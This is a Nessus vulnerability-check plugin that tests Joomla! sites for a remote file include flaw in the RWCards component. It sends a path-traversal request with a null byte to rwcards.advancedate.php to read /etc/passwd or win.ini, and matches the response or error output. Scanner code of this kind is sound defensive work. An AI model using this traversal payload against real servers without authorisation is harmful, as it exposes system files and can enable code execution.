#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63201);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_osvdb_id(83531);

  script_name(english:"RWCards Component for Joomla! 'mosConfig_absolute_path' Parameter Remote File Include");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the RWCards component for Joomla! running on the remote
host is affected by a remote file include vulnerability due to
improper sanitization of user-supplied input to the
'mosConfig_absolute_path' parameter before using it in the
rwcards.advancedate.php script to include PHP code. An
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  # http://packetstormsecurity.org/files/view/94688/joomlarwcards-rfi.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?69721c41");
  script_set_attribute(attribute:"see_also", value:"http://www.weberr.de");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:weberr:com_rwcards");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "RWCards";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('.rwcardsfull', '.rwcards');
  checks["/components/com_rwcards/css/rwcards.css"] = regexes;
  checks["/components/com_rwcards/css/rwcards.filloutform.css"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;
error = FALSE;
foreach file (files)
{
  attack =  mult_str(str:"../", nb:12) + file;
  url = "/components/com_rwcards/rwcards.advancedate.php?mosConfig_absolute_path=" + urlencode(str:attack) + '%00';

  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
     vuln = TRUE;
      contents = res[2];
      break;
  }
  # we get an error because magic_quotes was enabled
  else if (file + "\0/includes/version.php" >< res[2])
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res[2], file);
    break;
  }
  # we get an error claiming the file doesn't exist
  else if (
    "main(" +file+ "): failed to open stream: No such file" >< res[2] ||
    "include("+file+") [function.include]: failed to open stream: No such file" >< res[2]
  )
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res[2], file);
    break;
  }
  # we get an error about open_basedir restriction.
  else if ("open_basedir restriction in effect. File(" + file >< res[2])
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res[2], "open_basedir");
    break;
  }
}
if (vuln)
{
  if (error)
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : contents,
      rep_extra   :
       'Note that Nessus was not able to directly exploit this issue;'+
       '\nhowever, based on the error below, the install does appear to be'+
       '\naffected.'
    );
    exit(0);
  }

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(install_url + url),
    output      : contents,
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
